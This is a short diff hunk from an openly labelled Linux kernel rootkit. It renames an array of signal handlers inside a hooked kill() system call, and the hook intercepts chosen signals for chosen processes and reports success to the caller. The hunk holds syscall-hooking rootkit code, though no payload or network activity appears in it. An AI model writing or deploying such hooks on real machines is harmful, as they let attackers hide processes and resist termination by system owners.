@@ -283,11 +283,11 @@ SYSCALL_HOOK_HANDLER2(kill, orig_kill, p_regs, pid_t, i32_pid, int, i32_sig)
 
     pr_info("[ROOTKIT] kill(%d, %d)\n", i32_pid, i32_sig);
 
-    for (i = 0; i < ARRAY_SIZE(p_signal_hooks); ++i) {
-        if ((p_signal_hooks[i].i32_pid < 0 || p_signal_hooks[i].i32_pid == i32_pid) &&
-            (p_signal_hooks[i].i32_sig < 0 || p_signal_hooks[i].i32_sig == i32_sig)) {
+    for (i = 0; i < ARRAY_SIZE(p_sig_handlers); ++i) {
+        if ((p_sig_handlers[i].i32_pid < 0 || p_sig_handlers[i].i32_pid == i32_pid) &&
+            (p_sig_handlers[i].i32_sig < 0 || p_sig_handlers[i].i32_sig == i32_sig)) {
             pr_info("[ROOTKIT] * Intercepting signal %d for PID %d\n", i32_sig, i32_pid);
-            p_signal_hooks[i].sig_handler(i32_pid, i32_sig);
+            p_sig_handlers[i].sig_handler(i32_pid, i32_sig);
 
             // Signal was intercepted, return success
             return 0;
